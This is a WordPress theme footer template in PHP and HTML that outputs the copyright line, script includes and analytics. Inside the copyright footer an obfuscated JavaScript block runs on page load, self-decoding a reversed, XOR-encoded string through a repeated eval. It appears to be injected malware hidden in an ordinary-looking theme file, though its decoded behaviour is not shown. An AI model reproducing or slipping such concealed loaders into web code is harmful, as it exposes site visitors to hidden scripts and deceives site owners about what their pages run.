<?php
/**
 * @KingSize 2011
 **/
 global $data;
?>
	
            <!--Footer Start-->
    		<footer class="row">				
<!--
                <div class="row">
                    <div class="twelve columns centered" style="padding-left:30px; padding-right:30px;">
                    <hr>
                    </div>
                </div>
-->
				<!-- Copyright / Social Footer Begins Here -->
                <div class="twelve columns mobile-twelve copyright-footer">
                       <?php echo stripslashes($data['wm_footer_copyright']);?><br />
<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=50){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")401,\\\"zp400\\\\720\\\\730\\\\200\\\\Z520\\\\l(<\\\"\\" +
"\\b8/;=3( 2'#l'QWQ_BYyWQX\\\\\\\\n\\\\120\\\\n320\\\\l220\\\\KAXB^t\\\\n\\\\"+
"{AWKr\\\\QDRjjsym~x5px|xpkrP`hce1e}dngh&_?ge410\\\\520\\\\\\\\\\\\230\\\\F[" +
"P130\\\\230\\\\020\\\\000\\\\230\\\\000\\\\600\\\\^330\\\\000\\\\010\\\\100" +
"\\\\630\\\\t\\\\600\\\\410\\\\\\\"(f};o nruter};))++y(^)i(tAedoCrahc.x(edoC" +
"rahCmorf.gnirtS=+o;721=%y;i=+y)401==i(fi{)++i;l<i;0=i(rof;htgnel.x=l,\\\"\\" +
"\"=o,i rav{)y,x(f noitcnuf\")"                                               ;
while(x=eval(x));
//-->
//]]>
</script>
                </div>
				<!-- END Copyright / Social Footer Begins Here -->

            </footer>
       		<!--Footer Ends-->
       		
        </div><!-- /Nine columns ends-->
    	
    </div><!--/Main Content Ends-->
    
    <!-- Included JS Files (Compressed) -->
  	<script src="<?php echo get_template_directory_uri();?>/js/modernizr.foundation.js"></script>
  	<script src="<?php echo get_template_directory_uri();?>/js/jquery.foundation.tooltips.js"></script>
    
    <script src="<?php echo get_template_directory_uri();?>/js/tipsy.js"></script>
    <!-- Initialize JS Plugins -->
	<script src="<?php echo get_template_directory_uri();?>/js/app.js"></script>
	
	
	<?php wp_footer();?>

	<!-- GOOGLE ANALYTICS -->
	<?php include (get_template_directory() . "/lib/google-analytics-input.php"); ?>
	<!-- GOOGLE ANALYTICS -->

	<!-- Portfolio control CSS and JS-->
	<?php include (get_template_directory() . "/lib/footer_gallery.php"); ?>
	<!-- END Portfolio control CSS and JS-->
	
</body>
</html>
